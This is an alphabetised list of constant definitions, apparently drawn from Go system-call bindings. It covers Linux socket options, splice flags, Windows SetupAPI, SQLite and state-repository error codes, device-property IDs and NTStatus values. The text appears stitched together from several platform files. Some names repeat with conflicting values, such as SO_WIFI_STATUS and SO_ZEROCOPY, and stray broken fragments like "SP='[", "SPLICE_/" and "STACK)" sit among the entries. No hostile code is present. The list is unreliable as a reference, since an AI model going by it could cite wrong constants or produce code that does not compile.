SO_VM_SOCKETS_CONNECT_TIMEOUT_OLD           = 0x6
SO_VM_SOCKETS_NONBLOCK_TXRX                 = 0x7
SO_VM_SOCKETS_PEER_HOST_VM_ID               = 0x3
SO_VM_SOCKETS_TRUSTED                       = 0x5
SO_VRRP                       = 0x1017
SO_WANTMORE                             = 0x4000
SO_WANTOOBFLAG                          = 0x8000
SO_WIFI_STATUS                   = 0x25
SO_WIFI_STATUS                   = 0x29
SO_WROFF                      = 0x2
SO_ZEROCOPY                      = 0x3c
SO_ZEROCOPY                      = 0x3e
SO_ZEROIZE                        = 0x2000
SP='[ 
SPAPI_E_AUTHENTICODE_DISALLOWED                                           Handle        = 0x800F0240
SPAPI_E_AUTHENTICODE_PUBLISHER_NOT_TRUSTED                                Handle        = 0x800F0243
SPAPI_E_AUTHENTICODE_TRUSTED_PUBLISHER                                    Handle        = 0x800F0241
SPAPI_E_AUTHENTICODE_TRUST_NOT_ESTABLISHED                                Handle        = 0x800F0242
SPAPI_E_BAD_INTERFACE_INSTALLSECT                                         Handle        = 0x800F021D
SPAPI_E_BAD_SECTION_NAME_LINE                                             Handle        = 0x800F0001
SPAPI_E_BAD_SERVICE_INSTALLSECT                                           Handle        = 0x800F0217
SPAPI_E_CANT_LOAD_CLASS_ICON                                              Handle        = 0x800F020C
SPAPI_E_CANT_REMOVE_DEVINST                                               Handle        = 0x800F0232
SPAPI_E_CLASS_MISMATCH                                                    Handle        = 0x800F0201
SPAPI_E_DEVICE_INSTALLER_NOT_READY                                        Handle        = 0x800F0246
SPAPI_E_DEVICE_INSTALL_BLOCKED                                            Handle        = 0x800F0248
SPAPI_E_DEVICE_INTERFACE_ACTIVE                                           Handle        = 0x800F021B
SPAPI_E_DEVICE_INTERFACE_REMOVED                                          Handle        = 0x800F021C
SPAPI_E_DEVINFO_DATA_LOCKED                                               Handle        = 0x800F0213
SPAPI_E_DEVINFO_LIST_LOCKED                                               Handle        = 0x800F0212
SPAPI_E_DEVINFO_NOT_REGISTERED                                            Handle        = 0x800F0208
SPAPI_E_DEVINSTALL_QUEUE_NONNATIVE                                        Handle        = 0x800F0230
SPAPI_E_DEVINST_ALREADY_EXISTS                                            Handle        = 0x800F0207
SPAPI_E_DI_BAD_PATH                                                       Handle        = 0x800F0214
SPAPI_E_DI_DONT_INSTALL                                                   Handle        = 0x800F022B
SPAPI_E_DI_DO_DEFAULT                                                     Handle        = 0x800F020E
SPAPI_E_DI_FUNCTION_OBSOLETE                                              Handle        = 0x800F023E
SPAPI_E_DI_NOFILECOPY                                                     Handle        = 0x800F020F
SPAPI_E_DI_POSTPROCESSING_REQUIRED                                        Handle        = 0x800F0226
SPAPI_E_DRIVER_INSTALL_BLOCKED                                            Handle        = 0x800F0249
SPAPI_E_DRIVER_NONNATIVE                                                  Handle        = 0x800F0234
SPAPI_E_DRIVER_STORE_ADD_FAILED                                           Handle        = 0x800F0247
SPAPI_E_DRIVER_STORE_DELETE_FAILED                                        Handle        = 0x800F024C
SPAPI_E_DUPLICATE_FOUND                                                   Handle        = 0x800F0202
SPAPI_E_ERROR_NOT_INSTALLED                                               Handle        = 0x800F1000
SPAPI_E_EXPECTED_SECTION_NAME                                             Handle        = 0x800F0000
SPAPI_E_FILEQUEUE_LOCKED                                                  Handle        = 0x800F0216
SPAPI_E_FILE_HASH_NOT_IN_CATALOG                                          Handle        = 0x800F024B
SPAPI_E_GENERAL_SYNTAX                                                    Handle        = 0x800F0003
SPAPI_E_INCORRECTLY_COPIED_INF                                            Handle        = 0x800F0237
SPAPI_E_INF_IN_USE_BY_DEVICES                                             Handle        = 0x800F023D
SPAPI_E_INVALID_CLASS                                                     Handle        = 0x800F0206
SPAPI_E_INVALID_CLASS_INSTALLER                                           Handle        = 0x800F020D
SPAPI_E_INVALID_COINSTALLER                                               Handle        = 0x800F0227
SPAPI_E_INVALID_DEVINST_NAME                                              Handle        = 0x800F0205
SPAPI_E_INVALID_FILTER_DRIVER                                             Handle        = 0x800F022C
SPAPI_E_INVALID_HWPROFILE                                                 Handle        = 0x800F0210
SPAPI_E_INVALID_INF_LOGCONFIG                                             Handle        = 0x800F022A
SPAPI_E_INVALID_MACHINENAME                                               Handle        = 0x800F0220
SPAPI_E_INVALID_PROPPAGE_PROVIDER                                         Handle        = 0x800F0224
SPAPI_E_INVALID_REFERENCE_STRING                                          Handle        = 0x800F021F
SPAPI_E_INVALID_REG_PROPERTY                                              Handle        = 0x800F0209
SPAPI_E_INVALID_TARGET                                                    Handle        = 0x800F0233
SPAPI_E_IN_WOW64                                                          Handle        = 0x800F0235
SPAPI_E_KEY_DOES_NOT_EXIST                                                Handle        = 0x800F0204
SPAPI_E_LINE_NOT_FOUND                                                    Handle        = 0x800F0102
SPAPI_E_MACHINE_UNAVAILABLE                                               Handle        = 0x800F0222
SPAPI_E_NON_WINDOWS_DRIVER                                                Handle        = 0x800F022E
SPAPI_E_NON_WINDOWS_NT_DRIVER                                             Handle        = 0x800F022D
SPAPI_E_NOT_AN_INSTALLED_OEM_INF                                          Handle        = 0x800F023C
SPAPI_E_NOT_DISABLEABLE                                                   Handle        = 0x800F0231
SPAPI_E_NO_ASSOCIATED_CLASS                                               Handle        = 0x800F0200
SPAPI_E_NO_ASSOCIATED_SERVICE                                             Handle        = 0x800F0219
SPAPI_E_NO_AUTHENTICODE_CATALOG                                           Handle        = 0x800F023F
SPAPI_E_NO_BACKUP                                                         Handle        = 0x800F0103
SPAPI_E_NO_CATALOG_FOR_OEM_INF                                            Handle        = 0x800F022F
SPAPI_E_NO_CLASSINSTALL_PARAMS                                            Handle        = 0x800F0215
SPAPI_E_NO_CLASS_DRIVER_LIST                                              Handle        = 0x800F0218
SPAPI_E_NO_COMPAT_DRIVERS                                                 Handle        = 0x800F0228
SPAPI_E_NO_CONFIGMGR_SERVICES                                             Handle        = 0x800F0223
SPAPI_E_NO_DEFAULT_DEVICE_INTERFACE                                       Handle        = 0x800F021A
SPAPI_E_NO_DEVICE_ICON                                                    Handle        = 0x800F0229
SPAPI_E_NO_DEVICE_SELECTED                                                Handle        = 0x800F0211
SPAPI_E_NO_DRIVER_SELECTED                                                Handle        = 0x800F0203
SPAPI_E_NO_INF                                                            Handle        = 0x800F020A
SPAPI_E_NO_SUCH_DEVICE_INTERFACE                                          Handle        = 0x800F0225
SPAPI_E_NO_SUCH_DEVINST                                                   Handle        = 0x800F020B
SPAPI_E_NO_SUCH_INTERFACE_CLASS                                           Handle        = 0x800F021E
SPAPI_E_ONLY_VALIDATE_VIA_AUTHENTICODE                                    Handle        = 0x800F0245
SPAPI_E_PNP_REGISTRY_ERROR                                                Handle        = 0x800F023A
SPAPI_E_REMOTE_COMM_FAILURE                                               Handle        = 0x800F0221
SPAPI_E_REMOTE_REQUEST_UNSUPPORTED                                        Handle        = 0x800F023B
SPAPI_E_SCE_DISABLED                                                      Handle        = 0x800F0238
SPAPI_E_SECTION_NAME_TOO_LONG                                             Handle        = 0x800F0002
SPAPI_E_SECTION_NOT_FOUND                                                 Handle        = 0x800F0101
SPAPI_E_SET_SYSTEM_RESTORE_POINT                                          Handle        = 0x800F0236
SPAPI_E_SIGNATURE_OSATTRIBUTE_MISMATCH                                    Handle        = 0x800F0244
SPAPI_E_UNKNOWN_EXCEPTION                                                 Handle        = 0x800F0239
SPAPI_E_UNRECOVERABLE_STACK_OVERFLOW                                      Handle        = 0x800F0300
SPAPI_E_WRONG_INF_STYLE                                                   Handle        = 0x800F0100
SPAPI_E_WRONG_INF_TYPE                                                    Handle        = 0x800F024A
SPDIT_CLASSDRIVER  SPDIT = 0x00000001
SPDIT_COMPATDRIVER SPDIT = 0x00000002
SPDIT_NODRIVER     SPDIT = 0x00000000
SPDRP_ADDRESS                     SPDRP = 0x0000001C // Device Address (R)
SPDRP_BASE_CONTAINERID            SPDRP = 0x00000024 // Base ContainerID (R)
SPDRP_BUSNUMBER                   SPDRP = 0x00000015 // BusNumber (R)
SPDRP_BUSTYPEGUID                 SPDRP = 0x00000013 // BusTypeGUID (R)
SPDRP_CAPABILITIES                SPDRP = 0x0000000F // Capabilities (R)
SPDRP_CHARACTERISTICS             SPDRP = 0x0000001B // Device Characteristics (R/W)
SPDRP_CLASS                       SPDRP = 0x00000007 // Class (R--tied to ClassGUID)
SPDRP_CLASSGUID                   SPDRP = 0x00000008 // ClassGUID (R/W)
SPDRP_COMPATIBLEIDS               SPDRP = 0x00000002 // CompatibleIDs (R/W)
SPDRP_CONFIGFLAGS                 SPDRP = 0x0000000A // ConfigFlags (R/W)
SPDRP_DEVICEDESC                  SPDRP = 0x00000000 // DeviceDesc (R/W)
SPDRP_DEVICE_POWER_DATA           SPDRP = 0x0000001E // Device Power Data (R)
SPDRP_DEVTYPE                     SPDRP = 0x00000019 // Device Type (R/W)
SPDRP_DRIVER                      SPDRP = 0x00000009 // Driver (R/W)
SPDRP_ENUMERATOR_NAME             SPDRP = 0x00000016 // Enumerator Name (R)
SPDRP_EXCLUSIVE                   SPDRP = 0x0000001A // Device is exclusive-access (R/W)
SPDRP_FRIENDLYNAME                SPDRP = 0x0000000C // FriendlyName (R/W)
SPDRP_HARDWAREID                  SPDRP = 0x00000001 // HardwareID (R/W)
SPDRP_INSTALL_STATE               SPDRP = 0x00000022 // Device Install State (R)
SPDRP_LEGACYBUSTYPE               SPDRP = 0x00000014 // LegacyBusType (R)
SPDRP_LOCATION_INFORMATION        SPDRP = 0x0000000D // LocationInformation (R/W)
SPDRP_LOCATION_PATHS              SPDRP = 0x00000023 // Device Location Paths (R)
SPDRP_LOWERFILTERS                SPDRP = 0x00000012 // LowerFilters (R/W)
SPDRP_MAXIMUM_PROPERTY SPDRP = 0x00000025 // Upper bound on ordinals
SPDRP_MFG                         SPDRP = 0x0000000B // Mfg (R/W)
SPDRP_PHYSICAL_DEVICE_OBJECT_NAME SPDRP = 0x0000000E // PhysicalDeviceObjectName (R)
SPDRP_REMOVAL_POLICY              SPDRP = 0x0000001F // Removal Policy (R)
SPDRP_REMOVAL_POLICY_HW_DEFAULT   SPDRP = 0x00000020 // Hardware Removal Policy (R)
SPDRP_REMOVAL_POLICY_OVERRIDE     SPDRP = 0x00000021 // Removal Policy Override (RW)
SPDRP_SERVICE                     SPDRP = 0x00000004 // Service (R/W)
SPDRP_UI_NUMBER                   SPDRP = 0x00000010 // UiNumber (R)
SPDRP_UI_NUMBER_DESC_FORMAT       SPDRP = 0x0000001D // UiNumberDescFormat (R/W)
SPDRP_UPPERFILTERS                SPDRP = 0x00000011 // UpperFilters (R/W)
SPECIFIC_RIGHTS_ALL      = 0x0000FFFF
SPLICE_/ 
SPLICE_F_GIFT                               = 0x8
SPLICE_F_MORE                               = 0x4
SPLICE_F_MOVE                               = 0x1
SPLICE_F_NONBLOCK                           = 0x2
SP_MAX_MACHINENAME_LENGTH = MAX_PATH 
SQLITE_E_ABORT                                                            Handle        = 0x87AF0004
SQLITE_E_ABORT_ROLLBACK                                                   Handle        = 0x87AF0204
SQLITE_E_AUTH                                                             Handle        = 0x87AF0017
SQLITE_E_BUSY                                                             Handle        = 0x87AF0005
SQLITE_E_BUSY_RECOVERY                                                    Handle        = 0x87AF0105
SQLITE_E_BUSY_SNAPSHOT                                                    Handle        = 0x87AF0205
SQLITE_E_CANTOPEN                                                         Handle        = 0x87AF000E
SQLITE_E_CANTOPEN_CONVPATH                                                Handle        = 0x87AF040E
SQLITE_E_CANTOPEN_FULLPATH                                                Handle        = 0x87AF030E
SQLITE_E_CANTOPEN_ISDIR                                                   Handle        = 0x87AF020E
SQLITE_E_CANTOPEN_NOTEMPDIR                                               Handle        = 0x87AF010E
SQLITE_E_CONSTRAINT                                                       Handle        = 0x87AF0013
SQLITE_E_CONSTRAINT_CHECK                                                 Handle        = 0x87AF0113
SQLITE_E_CONSTRAINT_COMMITHOOK                                            Handle        = 0x87AF0213
SQLITE_E_CONSTRAINT_FOREIGNKEY                                            Handle        = 0x87AF0313
SQLITE_E_CONSTRAINT_FUNCTION                                              Handle        = 0x87AF0413
SQLITE_E_CONSTRAINT_NOTNULL                                               Handle        = 0x87AF0513
SQLITE_E_CONSTRAINT_PRIMARYKEY                                            Handle        = 0x87AF0613
SQLITE_E_CONSTRAINT_ROWID                                                 Handle        = 0x87AF0A13
SQLITE_E_CONSTRAINT_TRIGGER                                               Handle        = 0x87AF0713
SQLITE_E_CONSTRAINT_UNIQUE                                                Handle        = 0x87AF0813
SQLITE_E_CONSTRAINT_VTAB                                                  Handle        = 0x87AF0913
SQLITE_E_CORRUPT                                                          Handle        = 0x87AF000B
SQLITE_E_CORRUPT_VTAB                                                     Handle        = 0x87AF010B
SQLITE_E_DONE                                                             Handle        = 0x87AF0065
SQLITE_E_EMPTY                                                            Handle        = 0x87AF0010
SQLITE_E_ERROR                                                            Handle        = 0x87AF0001
SQLITE_E_FORMAT                                                           Handle        = 0x87AF0018
SQLITE_E_FULL                                                             Handle        = 0x87AF000D
SQLITE_E_INTERNAL                                                         Handle        = 0x87AF0002
SQLITE_E_INTERRUPT                                                        Handle        = 0x87AF0009
SQLITE_E_IOERR                                                            Handle        = 0x87AF000A
SQLITE_E_IOERR_ACCESS                                                     Handle        = 0x87AF0D0A
SQLITE_E_IOERR_AUTH                                                       Handle        = 0x87AF1A03
SQLITE_E_IOERR_BLOCKED                                                    Handle        = 0x87AF0B0A
SQLITE_E_IOERR_CHECKRESERVEDLOCK                                          Handle        = 0x87AF0E0A
SQLITE_E_IOERR_CLOSE                                                      Handle        = 0x87AF100A
SQLITE_E_IOERR_CONVPATH                                                   Handle        = 0x87AF1A0A
SQLITE_E_IOERR_DELETE                                                     Handle        = 0x87AF0A0A
SQLITE_E_IOERR_DELETE_NOENT                                               Handle        = 0x87AF170A
SQLITE_E_IOERR_DIR_CLOSE                                                  Handle        = 0x87AF110A
SQLITE_E_IOERR_DIR_FSYNC                                                  Handle        = 0x87AF050A
SQLITE_E_IOERR_FSTAT                                                      Handle        = 0x87AF070A
SQLITE_E_IOERR_FSYNC                                                      Handle        = 0x87AF040A
SQLITE_E_IOERR_GETTEMPPATH                                                Handle        = 0x87AF190A
SQLITE_E_IOERR_LOCK                                                       Handle        = 0x87AF0F0A
SQLITE_E_IOERR_MMAP                                                       Handle        = 0x87AF180A
SQLITE_E_IOERR_NOMEM                                                      Handle        = 0x87AF0C0A
SQLITE_E_IOERR_RDLOCK                                                     Handle        = 0x87AF090A
SQLITE_E_IOERR_READ                                                       Handle        = 0x87AF010A
SQLITE_E_IOERR_SEEK                                                       Handle        = 0x87AF160A
SQLITE_E_IOERR_SHMLOCK                                                    Handle        = 0x87AF140A
SQLITE_E_IOERR_SHMMAP                                                     Handle        = 0x87AF150A
SQLITE_E_IOERR_SHMOPEN                                                    Handle        = 0x87AF120A
SQLITE_E_IOERR_SHMSIZE                                                    Handle        = 0x87AF130A
SQLITE_E_IOERR_SHORT_READ                                                 Handle        = 0x87AF020A
SQLITE_E_IOERR_TRUNCATE                                                   Handle        = 0x87AF060A
SQLITE_E_IOERR_UNLOCK                                                     Handle        = 0x87AF080A
SQLITE_E_IOERR_VNODE                                                      Handle        = 0x87AF1A02
SQLITE_E_IOERR_WRITE                                                      Handle        = 0x87AF030A
SQLITE_E_LOCKED                                                           Handle        = 0x87AF0006
SQLITE_E_LOCKED_SHAREDCACHE                                               Handle        = 0x87AF0106
SQLITE_E_MISMATCH                                                         Handle        = 0x87AF0014
SQLITE_E_MISUSE                                                           Handle        = 0x87AF0015
SQLITE_E_NOLFS                                                            Handle        = 0x87AF0016
SQLITE_E_NOMEM                                                            Handle        = 0x87AF0007
SQLITE_E_NOTADB                                                           Handle        = 0x87AF001A
SQLITE_E_NOTFOUND                                                         Handle        = 0x87AF000C
SQLITE_E_NOTICE                                                           Handle        = 0x87AF001B
SQLITE_E_NOTICE_RECOVER_ROLLBACK                                          Handle        = 0x87AF021B
SQLITE_E_NOTICE_RECOVER_WAL                                               Handle        = 0x87AF011B
SQLITE_E_PERM                                                             Handle        = 0x87AF0003
SQLITE_E_PROTOCOL                                                         Handle        = 0x87AF000F
SQLITE_E_RANGE                                                            Handle        = 0x87AF0019
SQLITE_E_READONLY                                                         Handle        = 0x87AF0008
SQLITE_E_READONLY_CANTLOCK                                                Handle        = 0x87AF0208
SQLITE_E_READONLY_DBMOVED                                                 Handle        = 0x87AF0408
SQLITE_E_READONLY_RECOVERY                                                Handle        = 0x87AF0108
SQLITE_E_READONLY_ROLLBACK                                                Handle        = 0x87AF0308
SQLITE_E_ROW                                                              Handle        = 0x87AF0064
SQLITE_E_SCHEMA                                                           Handle        = 0x87AF0011
SQLITE_E_TOOBIG                                                           Handle        = 0x87AF0012
SQLITE_E_WARNING                                                          Handle        = 0x87AF001C
SQLITE_E_WARNING_AUTOINDEX                                                Handle        = 0x87AF011C
SQUASHFS_MAGIC                              = 0x73717368
STACK)
STACK_END_MAGIC                             = 0x57ac6e9d
STANDARD_RIGHTS_ALL      = 0x001F0000
STANDARD_RIGHTS_EXECUTE  = READ_CONTROL
STANDARD_RIGHTS_READ     = READ_CONTROL
STANDARD_RIGHTS_REQUIRED = 0x000F0000
STANDARD_RIGHTS_WRITE    = READ_CONTROL
STARTF_USESHOWWINDOW   = 0x00000001
STARTF_USESTDHANDLES   = 0x00000100
STATEREPOSITORY_ERROR_CACHE_CORRUPTED                                     Handle        = 0x80670012
STATEREPOSITORY_ERROR_DICTIONARY_CORRUPTED                                Handle        = 0x80670005
STATEREPOSITORY_E_BLOCKED                                                 Handle        = 0x80670006
STATEREPOSITORY_E_BUSY_RECOVERY_RETRY                                     Handle        = 0x80670008
STATEREPOSITORY_E_BUSY_RECOVERY_TIMEOUT_EXCEEDED                          Handle        = 0x8067000D
STATEREPOSITORY_E_BUSY_RETRY                                              Handle        = 0x80670007
STATEREPOSITORY_E_BUSY_TIMEOUT_EXCEEDED                                   Handle        = 0x8067000C
STATEREPOSITORY_E_CONCURRENCY_LOCKING_FAILURE                             Handle        = 0x80670001
STATEREPOSITORY_E_CONFIGURATION_INVALID                                   Handle        = 0x80670003
STATEREPOSITORY_E_LOCKED_RETRY                                            Handle        = 0x80670009
STATEREPOSITORY_E_LOCKED_SHAREDCACHE_RETRY                                Handle        = 0x8067000A
STATEREPOSITORY_E_LOCKED_SHAREDCACHE_TIMEOUT_EXCEEDED                     Handle        = 0x8067000F
STATEREPOSITORY_E_LOCKED_TIMEOUT_EXCEEDED                                 Handle        = 0x8067000E
STATEREPOSITORY_E_SERVICE_STOP_IN_PROGRESS                                Handle        = 0x80670010
STATEREPOSITORY_E_STATEMENT_INPROGRESS                                    Handle        = 0x80670002
STATEREPOSITORY_E_TRANSACTION_REQUIRED                                    Handle        = 0x8067000B
STATEREPOSITORY_E_UNKNOWN_SCHEMA_VERSION                                  Handle        = 0x80670004
STATEREPOSITORY_TRANSACTION_CALLER_ID_CHANGED                             Handle        = 0x00670013
STATEREPOSITORY_TRANSACTION_IN_PROGRESS                                   Handle        = 0x00670014
STATEREPOSTORY_E_NESTED_TRANSACTION_NOT_SUPPORTED                         Handle        = 0x80670011
STATFIXLEN = 49
STATMAX    = 65535
STATUS_ABANDONED                                                          NTStatus      = 0x00000080
STATUS_ABANDONED_WAIT_0                                                   NTStatus      = 0x00000080
STATUS_ABANDONED_WAIT_63                                                  NTStatus      = 0x000000BF
STATUS_ABANDON_HIBERFILE                                                  NTStatus      = 0x40000033
STATUS_ABIOS_INVALID_COMMAND                                              NTStatus      = 0xC0000113
STATUS_ABIOS_INVALID_LID                                                  NTStatus      = 0xC0000114
STATUS_ABIOS_INVALID_SELECTOR                                             NTStatus      = 0xC0000116
STATUS_ABIOS_LID_ALREADY_OWNED                                            NTStatus      = 0xC0000111
STATUS_ABIOS_LID_NOT_EXIST                                                NTStatus      = 0xC0000110
STATUS_ABIOS_NOT_LID_OWNER                                                NTStatus      = 0xC0000112
STATUS_ABIOS_NOT_PRESENT                                                  NTStatus      = 0xC000010F
STATUS_ABIOS_SELECTOR_NOT_AVAILABLE                                       NTStatus      = 0xC0000115
STATUS_ACCESS_AUDIT_BY_POLICY                                             NTStatus      = 0x40000032
STATUS_ACCESS_DENIED                                                      NTStatus      = 0xC0000022
STATUS_ACCESS_DISABLED_BY_POLICY_DEFAULT                                  NTStatus      = 0xC0000361
STATUS_ACCESS_DISABLED_BY_POLICY_OTHER                                    NTStatus      = 0xC0000364
STATUS_ACCESS_DISABLED_BY_POLICY_PATH                                     NTStatus      = 0xC0000362
STATUS_ACCESS_DISABLED_BY_POLICY_PUBLISHER                                NTStatus      = 0xC0000363
STATUS_ACCESS_DISABLED_NO_SAFER_UI_BY_POLICY                              NTStatus      = 0xC0000372
STATUS_ACCESS_VIOLATION                                                   NTStatus      = 0xC0000005
STATUS_ACCOUNT_DISABLED                                                   NTStatus      = 0xC0000072
STATUS_ACCOUNT_EXPIRED                                                    NTStatus      = 0xC0000193
STATUS_ACCOUNT_LOCKED_OUT                                                 NTStatus      = 0xC0000234
STATUS_ACCOUNT_RESTRICTION                                                NTStatus      = 0xC000006E
STATUS_ACPI_ACQUIRE_GLOBAL_LOCK                                           NTStatus      = 0xC0140012
STATUS_ACPI_ADDRESS_NOT_MAPPED                                            NTStatus      = 0xC014000C
STATUS_ACPI_ALREADY_INITIALIZED                                           NTStatus      = 0xC0140013
STATUS_ACPI_ASSERT_FAILED                                                 NTStatus      = 0xC0140003
STATUS_ACPI_FATAL                                                         NTStatus      = 0xC0140006
STATUS_ACPI_HANDLER_COLLISION                                             NTStatus      = 0xC014000E
STATUS_ACPI_INCORRECT_ARGUMENT_COUNT                                      NTStatus      = 0xC014000B
STATUS_ACPI_INVALID_ACCESS_SIZE                                           NTStatus      = 0xC0140011
STATUS_ACPI_INVALID_ARGTYPE                                               NTStatus      = 0xC0140008
STATUS_ACPI_INVALID_ARGUMENT                                              NTStatus      = 0xC0140005
STATUS_ACPI_INVALID_DATA                                                  NTStatus      = 0xC014000F
STATUS_ACPI_INVALID_EVENTTYPE                                             NTStatus      = 0xC014000D
STATUS_ACPI_INVALID_INDEX                                                 NTStatus      = 0xC0140004
STATUS_ACPI_INVALID_MUTEX_LEVEL                                           NTStatus      = 0xC0140015
STATUS_ACPI_INVALID_OBJTYPE                                               NTStatus      = 0xC0140009
STATUS_ACPI_INVALID_OPCODE                                                NTStatus      = 0xC0140001
STATUS_ACPI_INVALID_REGION                                                NTStatus      = 0xC0140010
STATUS_ACPI_INVALID_SUPERNAME                                             NTStatus      = 0xC0140007
STATUS_ACPI_INVALID_TABLE                                                 NTStatus      = 0xC0140019
STATUS_ACPI_INVALID_TARGETTYPE                                            NTStatus      = 0xC014000A
STATUS_ACPI_MUTEX_NOT_OWNED                                               NTStatus      = 0xC0140016
STATUS_ACPI_MUTEX_NOT_OWNER                                               NTStatus      = 0xC0140017
STATUS_ACPI_NOT_INITIALIZED                                               NTStatus      = 0xC0140014
STATUS_ACPI_POWER_REQUEST_FAILED                                          NTStatus      = 0xC0140021
STATUS_ACPI_REG_HANDLER_FAILED                                            NTStatus      = 0xC0140020
STATUS_ACPI_RS_ACCESS                                                     NTStatus      = 0xC0140018
STATUS_ACPI_STACK_OVERFLOW                                                NTStatus      = 0xC0140002
STATUS_ADAPTER_HARDWARE_ERROR                                             NTStatus      = 0xC00000C2
STATUS_ADDRESS_ALREADY_ASSOCIATED                                         NTStatus      = 0xC0000238
STATUS_ADDRESS_ALREADY_EXISTS                                             NTStatus      = 0xC000020A
STATUS_ADDRESS_CLOSED                                                     NTStatus      = 0xC000020B
STATUS_ADDRESS_NOT_ASSOCIATED                                             NTStatus      = 0xC0000239
STATUS_ADMINLESS_ACCESS_DENIED                                            NTStatus      = 0xC000A204
STATUS_ADVANCED_INSTALLER_FAILED                                          NTStatus      = 0xC0150020
STATUS_AGENTS_EXHAUSTED                                                   NTStatus      = 0xC0000085
STATUS_ALERTED                                                            NTStatus      = 0x00000101
STATUS_ALIAS_EXISTS                                                       NTStatus      = 0xC0000154
STATUS_ALLOCATE_BUCKET                                                    NTStatus      = 0xC000022F
STATUS_ALLOTTED_SPACE_EXCEEDED                                            NTStatus      = 0xC0000099
STATUS_ALL_SIDS_FILTERED                                                  NTStatus      = 0xC000035E
STATUS_ALL_USER_TRUST_QUOTA_EXCEEDED                                      NTStatus      = 0xC0000402
STATUS_ALPC_CHECK_COMPLETION_LIST                                         NTStatus      = 0x40000030
STATUS_ALREADY_COMMITTED                                                  NTStatus      = 0xC0000021
STATUS_ALREADY_COMPLETE                                                   NTStatus      = 0x000000FF
STATUS_ALREADY_DISCONNECTED                                               NTStatus      = 0x80000025
STATUS_ALREADY_HAS_STREAM_ID                                              NTStatus      = 0xC000050E
STATUS_ALREADY_INITIALIZED                                                NTStatus      = 0xC0000510
STATUS_ALREADY_REGISTERED                                                 NTStatus      = 0xC0000718
STATUS_ALREADY_WIN32                                                      NTStatus      = 0x4000001B
STATUS_AMBIGUOUS_SYSTEM_DEVICE                                            NTStatus      = 0xC0000451
STATUS_APC_RETURNED_WHILE_IMPERSONATING                                   NTStatus      = 0xC0000711
STATUS_APISET_NOT_HOSTED                                                  NTStatus      = 0xC0000481
STATUS_APISET_NOT_PRESENT                                                 NTStatus      = 0xC0000482
STATUS_APPEXEC_CONDITION_NOT_SATISFIED                                    NTStatus      = 0xC0EC0000
STATUS_APPEXEC_HANDLE_INVALIDATED                                         NTStatus      = 0xC0EC0001
STATUS_APPEXEC_HOST_ID_MISMATCH                                           NTStatus      = 0xC0EC0006
STATUS_APPEXEC_INVALID_HOST_GENERATION                                    NTStatus      = 0xC0EC0002
STATUS_APPEXEC_INVALID_HOST_STATE                                         NTStatus      = 0xC0EC0004
STATUS_APPEXEC_NO_DONOR                                                   NTStatus      = 0xC0EC0005
STATUS_APPEXEC_UNEXPECTED_PROCESS_REGISTRATION                            NTStatus      = 0xC0EC0003
STATUS_APPEXEC_UNKNOWN_USER                                               NTStatus      = 0xC0EC0007
STATUS_APPHELP_BLOCK                                                      NTStatus      = 0xC000035D
STATUS_APPX_FILE_NOT_ENCRYPTED                                            NTStatus      = 0xC00004A6
STATUS_APPX_INTEGRITY_FAILURE_CLR_NGEN                                    NTStatus      = 0xC000047F
STATUS_APP_DATA_CORRUPT                                                   NTStatus      = 0xC000A283
STATUS_APP_DATA_EXPIRED                                                   NTStatus      = 0xC000A282
STATUS_APP_DATA_LIMIT_EXCEEDED                                            NTStatus      = 0xC000A284
STATUS_APP_DATA_NOT_FOUND                                                 NTStatus      = 0xC000A281
STATUS_APP_DATA_REBOOT_REQUIRED                                           NTStatus      = 0xC000A285
STATUS_APP_INIT_FAILURE                                                   NTStatus      = 0xC0000145
STATUS_ARBITRATION_UNHANDLED                                              NTStatus      = 0x40000026
STATUS_ARRAY_BOUNDS_EXCEEDED                                              NTStatus      = 0xC000008C
STATUS_ASSERTION_FAILURE                                                  NTStatus      = 0xC0000420
STATUS_ATTACHED_EXECUTABLE_MEMORY_WRITE                                   NTStatus      = 0xC0000725
STATUS_ATTRIBUTE_NOT_PRESENT                                              NTStatus      = 0xC000050C
STATUS_AUDIO_ENGINE_NODE_NOT_FOUND                                        NTStatus      = 0xC0440001
STATUS_AUDITING_DISABLED                                                  NTStatus      = 0xC0000356
STATUS_AUDIT_FAILED                                                       NTStatus      = 0xC0000244
STATUS_AUTHENTICATION_FIREWALL_FAILED                                     NTStatus      = 0xC0000413
STATUS_AUTHIP_FAILURE                                                     NTStatus      = 0xC000A086
STATUS_AUTH_TAG_MISMATCH                                                  NTStatus      = 0xC000A002
STATUS_BACKUP_CONTROLLER                                                  NTStatus      = 0xC0000187
STATUS_BAD_BINDINGS                                                       NTStatus      = 0xC000035B
STATUS_BAD_CLUSTERS                                                       NTStatus      = 0xC0000805
STATUS_BAD_COMPRESSION_BUFFER                                             NTStatus      = 0xC0000242
STATUS_BAD_CURRENT_DIRECTORY                                              NTStatus      = 0x40000007
STATUS_BAD_DATA                                                           NTStatus      = 0xC000090B
STATUS_BAD_DESCRIPTOR_FORMAT                                              NTStatus      = 0xC00000E7
STATUS_BAD_DEVICE_TYPE                                                    NTStatus      = 0xC00000CB
STATUS_BAD_DLL_ENTRYPOINT                                                 NTStatus      = 0xC0000251
STATUS_BAD_FILE_TYPE                                                      NTStatus      = 0xC0000903
STATUS_BAD_FUNCTION_TABLE                                                 NTStatus      = 0xC00000FF
STATUS_BAD_IMPERSONATION_LEVEL                                            NTStatus      = 0xC00000A5
STATUS_BAD_INHERITANCE_ACL                                                NTStatus      = 0xC000007D
STATUS_BAD_INITIAL_PC                                                     NTStatus      = 0xC000000A
STATUS_BAD_INITIAL_STACK                                                  NTStatus      = 0xC0000009
STATUS_BAD_KEY                                                            NTStatus      = 0xC000090A
STATUS_BAD_LOGON_SESSION_STATE                                            NTStatus      = 0xC0000104
STATUS_BAD_MASTER_BOOT_RECORD                                             NTStatus      = 0xC00000A9
STATUS_BAD_MCFG_TABLE                                                     NTStatus      = 0xC0000908
STATUS_BAD_NETWORK_NAME                                                   NTStatus      = 0xC00000CC
STATUS_BAD_NETWORK_PATH                                                   NTStatus      = 0xC00000BE
STATUS_BAD_REMOTE_ADAPTER                                                 NTStatus      = 0xC00000C5
STATUS_BAD_SERVICE_ENTRYPOINT                                             NTStatus      = 0xC0000252
STATUS_BAD_STACK                                                          NTStatus      = 0xC0000028
STATUS_BAD_TOKEN_TYPE                                                     NTStatus      = 0xC00000A8
STATUS_BAD_VALIDATION_CLASS                                               NTStatus      = 0xC00000A7
STATUS_BAD_WORKING_SET_LIMIT                                              NTStatus      = 0xC000004C
STATUS_BCD_NOT_ALL_ENTRIES_IMPORTED                                       NTStatus      = 0x80390001
